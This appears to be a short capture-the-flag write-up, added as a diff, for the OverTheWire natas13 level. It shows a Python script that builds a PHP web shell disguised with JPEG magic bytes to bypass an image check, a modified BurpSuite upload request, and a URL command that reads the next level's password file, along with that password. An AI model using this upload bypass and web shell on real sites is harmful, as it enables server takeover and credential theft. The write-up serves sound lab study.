@@ -1,0 +1,30 @@
+So for this challenge (similar to natas12 lvl) i created a simple python3 script:
+
+	-> #!/bin/env/python3
+	   import os
+	   fh = open('revshell.php','wb')
+	   fh.write(b'\xFF\xD8\xFF\xE0' + b'<? passthru($_GET["cmd"]); ?>')
+	   fh.close()
+ 
+This creates a file including the magic numbers at the beggining. The magic number bypasses exif_imagetype
+and the function passthru to inyect our commands once we ask for this file to the server.
+
+Capture the request using BurpSuite just to be sure, and also modify some headers like these below
+
+------WebKitFormBoundaryh2eYYN4u3mtOrefb
+Content-Disposition: form-data; name="filename"
+Content-Type: application/x-php
+
+kdv7qbep24.php             -> (it's demanding we modify this, beacose it was trying to upload a .jpg instead of a php which is what we want!)
+------WebKitFormBoundaryh2eYYN4u3mtOrefb
+Content-Disposition: form-data; name="uploadedfile"; filename="revshell.php"
+Content-Type: application/x-php
+
+ÿØÿà<? passthru($_GET["cmd"]); ?>           ->(this is how our payload looks like!)
+------WebKitFormBoundaryh2eYYN4u3mtOrefb--
+
+
+Forward the request, and look for the recently file we've just uploaded. Should in here:
+	-> http://natas13.natas.labs.overtherwire/uploads/f20302gj4.php?cmd=cat /etc/natas_webpass/natas14
+
+	-> Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
